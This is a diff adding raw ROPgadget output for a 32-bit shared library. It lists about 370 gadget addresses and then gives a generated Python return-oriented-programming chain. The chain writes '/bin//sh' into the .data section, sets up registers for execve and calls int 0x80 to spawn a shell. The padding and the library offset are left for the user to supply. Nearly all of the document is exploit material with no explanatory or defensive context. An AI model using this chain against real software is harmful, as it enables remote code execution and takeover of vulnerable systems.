@@ -1,0 +1,445 @@
+gadgets information
+============================================================
+0x0000078a(null): dec %edi ; ret
+0x000008e1(null): jmp *(%ebx)
+0x00001a6f(null): jmp *%edx
+0x00001aa6(null): pop %edx ; ret
+0x0000203f(null): xchg %eax,%ebp ; ret
+0x000022a7(null): call *(%eax)
+0x00002867(null): mov $0xa9011612
+0x000030e7(null): call *(%ecx)
+0x0000365a(null): call *(%ebx)
+0x0000391c(null): inc %ebx ; ret
+0x0000393c(null): pop %esp ; ret
+0x00003bdc(null): mov $0x1e
+0x000063c8(null): inc %eax ; ret
+0x00009e73(null): jmp *%eax
+0x0001750f(null): pop %edi ; ret
+0x0001781f(null): pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x00017822(null): pop %ebp ; ret
+0x00017b2e(null): call *%gs:0x10
+0x00017b96(null): xor %eax,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x000181a8(null): pop %esi ; ret
+0x0001831a(null): call *%ecx
+0x0001848e(null): pop %ebx ; ret
+0x00018751(null): call *%eax
+0x00018842(null): add $0x18
+0x000189d8(null): mov $0x810010a4
+0x00018de3(null): add $0x00000000
+0x00018ed2(null): mov $0x8100109f
+0x000192e5(null): add $0x24
+0x00019857(null): add $0x08
+0x00019e7e(null): call *%edi
+0x0001a08c(null): add $0x8100108e
+0x0001acd9(null): mov $0x81001081
+0x0001afd5(null): mov $0x8100107e
+0x0001b0d9(null): mov $0x8100107d
+0x0001c092(null): mov %esi,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x0001c20a(null): call *%esi
+0x0001c5d5(null): mov $0x81001068
+0x0001c801(null): mov %edx,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x0001c801(null): mov %edx,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x0001dada(null): call *%ebx
+0x0001e3d5(null): mov $0x8100104a
+0x000214d5(null): mov $0x81001019
+0x00021e8c(null): add $0x81001010
+0x0002210b(null): mov %ebp,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x00022734(null): call *%edx
+0x000236d7(null): mov $0x81000ff7
+0x00024489(null): add $0x88
+0x000244af(null): pop %eax ; ret
+0x0002459d(null): mov %edi,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x00024f33(null): add $0x82
+0x000256cc(null): add $0x90
+0x000257d9(null): mov $0x81000fd6
+0x00025c62(null): add $0x0c
+0x00025cd2(null): mov $0x81000fd1
+0x00025cf6(null): add $0x28
+0x00025d12(null): add $0x1c
+0x00025da1(null): mov %ecx,%eax ; pop %ebx ; pop %esi ; pop %edi ; pop %ebp ; ret
+0x00026ad7(null): mov $0x81000fc3
+0x000273d2(null): mov $0x81000fba
+0x0002b60f(null): mov %ecx,(%eax) ; ret
+0x0002b7af(null): add $0x5e
+0x0002bcd2(null): mov $0x81000f71
+0x0002bd3f(null): add $0x10
+0x0002c0f5(null): int $0x80
+0x0002c3ab(null): add $0x5b
+0x0002c3d4(null): mov $0x81000f6a
+0x0002c964(null): sub $0x81000f65
+0x0002ca4c(null): xor %eax,%eax ; ret
+0x0002cc8f(null): mov $0xffffffff
+0x0002cdc0(null): mov $0x00000001
+0x0002cf49(null): mov %edx,%eax ; ret
+0x0002e0d7(null): mov $0x81000f4d
+0x0002e3ea(null): add $0x2c
+0x0002ebf6(null): call *(%edi)
+0x0002eed2(null): mov $0x81000f3f
+0x0002f7d9(null): mov $0x81000f36
+0x0002fcd2(null): mov $0x81000f31
+0x0003104e(null): mov (%edi),%edi ; ret
+0x000314d5(null): mov $0x81000f19
+0x000321d7(null): mov $0x81000f0c
+0x000385d5(null): mov $0x81000ea8
+0x0003aca5(null): inc %edi ; ret
+0x0003b78c(null): add $0x81000e77
+0x0003b7d7(null): mov $0x81000e76
+0x0003bd75(null): jmp *(%eax)
+0x0003d4b4(null): add $0x1cc48300
+0x0003d5bb(null): inc %eax ; inc %eax ; ret
+0x0003d628(null): mov %ecx,(%edx) ; ret
+0x0003d8be(null): mov $0x24040390
+0x0003df48(null): mov %eax,(%edi) ; pop %eax ; pop %ebx ; pop %esi ; pop %edi ; ret
+0x0003df4a(null): pop %eax ; pop %ebx ; pop %esi ; pop %edi ; ret
+0x0003df51(null): mov %ebx,(%edi) ; pop %ebx ; pop %esi ; pop %edi ; ret
+0x0003ed5a(null): pop %ebx ; pop %esi ; pop %ebp ; ret
+0x0003f0ff(null): add $0x04
+0x0003fa64(null): sub $0x81000e34
+0x0003fad4(null): mov $0x81000e33
+0x000495d5(null): mov $0x81000d98
+0x000496d5(null): mov $0x81000d97
+0x0004eea2(null): push %edi ; ret
+0x0005618f(null): push %ebp ; ret
+0x00057b6d(null): jmp *(%esi)
+0x0005e642(null): add $0x6c
+0x0005ec10(null): neg %eax | ret
+0x000600c6(null): jmp *%ecx
+0x000605d5(null): mov $0x81000c28
+0x000612d3(null): mov $0x81000c1b
+0x000632d4(null): mov $0x81000bfb
+0x00063351(null): mov %edi,%eax ; pop %ebx ; pop %esi ; pop %edi ; ret
+0x0006365d(null): jmp *(%ecx)
+0x00063a07(null): mov (%edx),%eax ; ret
+0x00064792(null): jmp *%esi
+0x0006a9d5(null): mov $0x81000b84
+0x0006acb9(null): dec %ecx ; ret
+0x0006b4d7(null): mov $0x81000b79
+0x0006dad7(null): mov $0x81000b53
+0x0006dbd5(null): mov $0x81000b52
+0x0006e852(null): mov %eax,(%edx) ; ret
+0x0006f0d7(null): mov $0x81000b3d
+0x0006f3d5(null): mov $0x81000b3a
+0x0006f4d3(null): mov $0x81000b39
+0x0006f8d7(null): mov $0x81000b35
+0x00073245(null): mov %edx,(%eax) ; ret
+0x000760d5(null): mov $0x81000acd
+0x000766d3(null): mov $0x81000ac7
+0x00076842(null): call *(%edx)
+0x000773d8(null): mov $0x81000aba
+0x000774cd(null): jmp *%edi
+0x00077920(null): pusha | ret
+0x00077c49(null): mov $0x5b08c483
+0x000789b0(null): mov (%esp),%ebx ; ret
+0x00078dc7(null): inc %eax ; pop %edi ; pop %esi ; ret
+0x00078dd2(null): mov $0x81000aa0
+0x00078e39(null): xor %eax,%eax ; pop %ebx ; ret
+0x00078e64(null): jmp *%ebx
+0x0007932f(null): mov %edx,%esi ; ret
+0x0007949d(null): add $0x01
+0x0007b6f3(null): inc %eax ; pop %edi ; ret
+0x0007bed7(null): mov $0x81000a6f
+0x000802e1(null): sub $0x01
+0x000803d5(null): mov $0x81000a2a
+0x0008159d(null): call *(%esi)
+0x00084689(null): add $0x5b5f0000
+0x00086f0c(null): add $0x5f
+0x00086fb1(null): add $0x5f0c428d
+0x000913b4(null): add $0x5f5bf889
+0x000924f0(null): xor %eax,%eax ; pop %edi ; ret
+0x00092576(null): mov $0x5ff801c0
+0x00092d75(null): mov $0x5ff801ff
+0x00093288(null): mov $0x5f5edd74
+0x0009375c(null): xor $0x810008f7
+0x000944d5(null): mov $0x810008e9
+0x000960d5(null): mov $0x810008cd
+0x000a3577(null): add $0x02
+0x000a3590(null): add $0x03
+0x000a35c0(null): mov $0x00000002
+0x000a35d0(null): mov $0x00000003
+0x000a35e0(null): mov $0x00000004
+0x000a35f0(null): mov $0x00000005
+0x000a3600(null): mov $0x00000006
+0x000a3610(null): mov $0x00000007
+0x000a3cd9(null): add $0x48
+0x000a76d9(null): mov $0x810007b7
+0x000aeed3(null): mov $0x8100073f
+0x000af6d5(null): mov $0x81000737
+0x000afbd7(null): mov $0x81000732
+0x000b26d5(null): mov $0x81000707
+0x000b2e0a(null): mov $0xfffffff2
+0x000b2fd5(null): mov $0x810006fe
+0x000b3bd5(null): mov $0x810006f2
+0x000b4bce(null): mov $0x00000020
+0x000b4c38(null): mov $0x00000040
+0x000b83a7(null): pop %ecx ; ret
+0x000bfcd7(null): mov $0x81000631
+0x000ccbd6(null): mov $0x81000562
+0x000cf0d2(null): mov $0x8100053d
+0x000d253e(null): add $0x5ed0895b
+0x000d4fd5(null): mov $0x810004de
+0x000d76d5(null): mov $0x810004b7
+0x000d7ae1(null): add $0xeb
+0x000d7bd3(null): mov $0x810004b2
+0x000d7dd2(null): mov $0x810004b0
+0x000d888f(null): add $0x3c
+0x000d88d7(null): add $0x68
+0x000d8ad6(null): mov $0x810004a3
+0x000d8fd4(null): mov $0x8100049e
+0x000d9032(null): mov %edx,%ebx ; ret
+0x000d93d2(null): mov $0x8100049a
+0x000d96d2(null): mov $0x81000497
+0x000d99d5(null): mov $0x81000494
+0x000d9bd3(null): mov $0x81000492
+0x000db6d9(null): mov $0x81000477
+0x000dc7c8(null): add $0x14
+0x000dc7d2(null): mov $0x81000466
+0x000de7d5(null): mov $0x81000446
+0x000e1bd5(null): mov $0x81000412
+0x000e209b(null): add $0x5b08c483
+0x000e30d2(null): mov $0x810003fd
+0x000e3fd3(null): mov $0x810003ee
+0x000e46d5(null): mov $0x810003e7
+0x000e54d5(null): mov $0x810003d9
+0x000e6840(null): add $0x38
+0x000e69d5(null): mov $0x810003c4
+0x000e9819(null): xchg %eax,%ebx ; ret
+0x000ea068(null): add $0x89
+0x000ee0d9(null): mov $0x8100034d
+0x000f035c(null): xor $0x8100032b
+0x000f34d6(null): mov $0x810002f9
+0x000f57d7(null): mov $0x810002d6
+0x000f701a(null): pop %esi ; pop %ebx ; pop %edx ; ret
+0x000f7041(null): pop %edx ; pop %ecx ; pop %ebx ; ret
+0x000f93d3(null): mov $0x8100029a
+0x000f94d2(null): mov $0x81000299
+0x000f97d2(null): mov $0x81000296
+0x000f9fd7(null): mov $0x8100028e
+0x000fa3d2(null): mov $0x8100028a
+0x000fac5c(null): xor $0x81000282
+0x000faef4(null): bswap %eax ; ret
+0x000fe9d5(null): mov $0x81000244
+0x000fecd5(null): mov $0x81000241
+0x00101003(null): jmp *(%edx)
+0x001013e4(null): mov $0xe8000001
+0x001019d5(null): mov $0x81000214
+0x00104bfa(null): xor $0x5f5ec031
+0x00104dd7(null): mov $0x810001e0
+0x0010594e(null): shr %eax ; ret
+0x00108f8c(null): add $0x8100019f
+0x0010add6(null): mov $0x81000180
+0x0010c9d5(null): mov $0x81000164
+0x0010e1d3(null): mov $0x8100014c
+0x0010e6d5(null): mov $0x81000147
+0x0010f8d7(null): mov $0x81000135
+0x001121d5(null): mov $0x8100010c
+0x00112e49(null): xchg %eax,%esp ; ret
+0x00114ad5(null): mov $0x810000e3
+0x00115b64(null): sub $0x810000d3
+0x00115d00(null): add $0x4c
+0x00116ad5(null): mov $0x810000c3
+0x0011753a(null): mov $0xc3810000
+0x00119bd2(null): mov $0x81000092
+0x0011b7d3(null): mov $0x81000076
+0x0011d7d2(null): mov $0x81000056
+0x0011f953(null): add $0x78
+0x0011fa82(null): sysenter
+0x001201d4(null): mov $0x8100002c
+0x00122a56(null): dec %eax ; ret
+0x00122aa6(null): push %eax ; ret
+0x00122b16(null): push %esp ; ret
+0x00122e99(null): mov (%esp),%ecx ; ret
+0x00122ea0(null): mov (%esp),%edx ; ret
+0x00122fd3(null): mov $0x81fffffe
+0x001233d5(null): mov $0x81fffffa
+0x001249d3(null): mov $0x81ffffe4
+0x001270d5(null): mov $0x81ffffbd
+0x00127bd3(null): mov $0x81ffffb2
+0x001285f7(null): inc %edx ; ret
+0x00128ed9(null): mov $0x81ffff9f
+0x0012b1d5(null): mov $0x81ffff7c
+0x0012b664(null): sub $0x81ffff78
+0x0012cad4(null): mov $0x81ffff63
+0x0012d1d5(null): mov $0x81ffff5c
+0x0012d664(null): sub $0x81ffff58
+0x0012f564(null): sub $0x81ffff39
+0x00130064(null): sub $0x81ffff2e
+0x00130bd4(null): mov $0x81ffff22
+0x00130fd7(null): mov $0x81ffff1e
+0x00131fd5(null): mov $0x81ffff0e
+0x00132fd5(null): mov $0x81fffefe
+0x00134cd4(null): mov $0x81fffee1
+0x001357d4(null): mov $0x81fffed6
+0x00136364(null): sub $0x81fffecb
+0x00139fc7(null): neg %eax | pop %ebp ; ret
+0x0013c6d8(null): mov $0x81fffe67
+0x00140078(null): push %edx ; ret
+0x00140c5b(null): add $0x76
+0x001414cf(null): mov $0x5b000000
+0x00142eef(null): add $0x07
+0x00142f16(null): add $0x0b
+0x00142f2f(null): add $0x0f
+0x00142f50(null): add $0x05
+0x00142f52(null): add $0x06c083c3
+0x00142f54(null): add $0x06
+0x00142f60(null): add $0x09
+0x00142f64(null): add $0x0a
+0x00142f70(null): add $0x0d
+0x00142f74(null): add $0x0e
+0x001440c3(null): mov %ecx,%eax ; ret
+0x001464d9(null): mov $0x81fffdc9
+0x001467d5(null): mov $0x81fffdc6
+0x00146fd5(null): mov $0x81fffdbe
+0x001470d2(null): mov $0x81fffdbd
+0x001474d2(null): mov $0x81fffdb9
+0x001546be(null): mov $0xc2c1c0bf
+0x0015556e(null): push %esi ; ret
+0x00156786(null): mov $0xfb67d10d
+0x00156a46(null): mov (%edx),%edi ; ret
+0x001583e0(null): jmp *(%edi)
+0x00169d6c(null): dec %esi ; ret
+0x00169da8(null): mov $0x3afffcc2
+0x001702fc(null): inc %ecx ; ret
+0x00170616(null): popa | ret
+0x00170958(null): inc %esi ; ret
+0x00170a27(null): add $0x0a017803
+0x00170c3d(null): dec %edx ; ret
+0x00170d53(null): add $0x0a01f103
+0x001710a7(null): add $0x0a029403
+0x0017315c(null): push %ebx ; ret
+0x001734c7(null): add $0x0a018003
+0x00173507(null): add $0x0a040003
+0x00173737(null): add $0x0a011703
+0x00173817(null): add $0x0a030103
+0x00173b71(null): mov $0x41140e0a
+0x0017431a(null): dec %ebx ; ret
+0x001750a7(null): add $0x0a01cf03
+0x001751a7(null): add $0x0a016203
+0x00177ad3(null): add $0x0a022c03
+0x00177b7b(null): add $0x79
+0x0017855b(null): add $0x0a013c03
+0x00178eab(null): add $0x0a01cd03
+0x0017906f(null): add $0x0a017e03
+0x001790eb(null): add $0x0a04c703
+0x00179b37(null): add $0x0a019103
+0x00179c4b(null): add $0x0a02ab03
+0x00179cb7(null): add $0x0a025003
+0x0017a713(null): add $0x0a013303
+0x0017c81b(null): add $0x0a028203
+0x0017da18(null): mov $0xd40000d7
+0x0017dbab(null): add $0x0a01b003
+0x0017ef3b(null): add $0x0a015c03
+0x0018239f(null): add $0x67
+0x001832fc(null): add $0x0a010003
+0x00184514(null): mov $0x88000142
+0x0018e353(null): add $0x0a020803
+0x0018ea83(null): add $0x0a012303
+0x001900cb(null): add $0x0a020e03
+0x00190c5f(null): add $0x0a044503
+0x00190caf(null): add $0x0a027103
+0x00190e17(null): add $0x0a04fb03
+0x0019106f(null): add $0x0a016d03
+0x0019109f(null): add $0x0a013e03
+0x0019262b(null): add $0x0a064503
+0x00192d8b(null): add $0x0a043503
+0x00194087(null): add $0x0a01c903
+0x0019480b(null): add $0x0a010703
+0x001948c9(null): mov $0x46140e0a
+0x0019499f(null): add $0x0a078603
+0x0019508f(null): add $0x0a01f003
+0x00195d48(null): push %ecx ; ret
+0x0019791f(null): add $0x0a040703
+0x00197d0b(null): add $0x0a041703
+0x00198ac8(null): mov $0x41100e0a
+0x0019a0bb(null): add $0x0a021c03
+0x0019a736(null): mov $0x0a
+0x0019b57b(null): add $0x0a016803
+0x0019b7f7(null): add $0x0a014303
+0x0019d0af(null): add $0x0a045303
+0x0019d433(null): add $0x0a025603
+0x0019f8ab(null): add $0x0a071c03
+0x0019fb37(null): add $0x0a056703
+0x001a06d3(null): add $0x0a01eb03
+0x001a370b(null): add $0x0a013d03
+0x001a39ef(null): add $0x0a01a703
+0x001a3cef(null): add $0x63
+0x001a45df(null): add $0x0a022d03
+0x001a468b(null): add $0x0a045c03
+0x001a4cff(null): add $0x0a015f03
+0x001a6ed3(null): add $0x0a010603
+0x001aa3a7(null): add $0x0a022603
+0x001ad237(null): add $0x0a019f03
+0x001ad3eb(null): add $0x0a01d803
+0x001ad48f(null): add $0x0a010103
+0x001ad597(null): add $0x0a02ed03
+0x001ad98f(null): add $0x0a019303
+0x001ae613(null): add $0x0a010d03
+
+Unique gadgets found: 373
+This binary depends on shared libraries (you might want to check these):
+    ld-linux.so.2
+
+
+Possible combinations.
+============================================================
+
+	- 0x0006e852(null) => mov %eax,(%edx) ; ret
+	- 0x000244af(null) => pop %eax ; ret
+	- 0x0001848e(null) => pop %ebx ; ret
+	- 0x000b83a7(null) => pop %ecx ; ret
+	- 0x00001aa6(null) => pop %edx ; ret
+	- 0x0002ca4c(null) => xor %eax,%eax ; ret
+	- 0x000063c8(null) => inc %eax ; ret
+	- .......... => inc %ax
+	- .......... => inc %al
+	- 0x0002c0f5(null) => int $0x80
+	- 0x0011fa82(null) => sysenter
+	- 0x00017822(null) => pop %ebp ; ret
+	- 0x001b8040(null) => .data Addr
+[+] Combo was found!
+#!/usr/bin/python
+# execve generated by Ropgadget v4.0.0
+from struct import pack
+
+p = ''
+# Padding goes here
+
+# This ROP Exploit has been generated for a shared object.
+# The addresses of the gadgets will need to be adjusted.
+# Set this variable to the offset of the shared library
+off = 0x0
+
+p += pack("<I", off + 0x00001aa6) # pop %edx ; ret
+p += pack("<I", off + 0x001b8040) # @ .data
+p += pack("<I", off + 0x000244af) # pop %eax ; ret
+p += "/bin" # /bin
+p += pack("<I", off + 0x0006e852) # mov %eax,(%edx) ; ret
+p += pack("<I", off + 0x00001aa6) # pop %edx ; ret
+p += pack("<I", off + 0x001b8044) # @ .data + 4
+p += pack("<I", off + 0x000244af) # pop %eax ; ret
+p += "/shA" # /shA
+p += pack("<I", off + 0x0006e852) # mov %eax,(%edx) ; ret
+p += pack("<I", off + 0x00001aa6) # pop %edx ; ret
+p += pack("<I", off + 0x001b8047) # @ .data + 7
+p += pack("<I", off + 0x0002ca4c) # xor %eax,%eax ; ret
+p += pack("<I", off + 0x0006e852) # mov %eax,(%edx) ; ret
+p += pack("<I", off + 0x0001848e) # pop %ebx ; ret
+p += pack("<I", off + 0x001b8040) # @ .data
+p += pack("<I", off + 0x000b83a7) # pop %ecx ; ret
+p += pack("<I", off + 0x001b8047) # @ .data + 7
+p += pack("<I", off + 0x00001aa6) # pop %edx ; ret
+p += pack("<I", off + 0x001b8047) # @ .data + 7
+p += pack("<I", off + 0x0002ca4c) # xor %eax,%eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x000063c8) # inc %eax ; ret
+p += pack("<I", off + 0x0002c0f5) # int $0x80
+print p
+
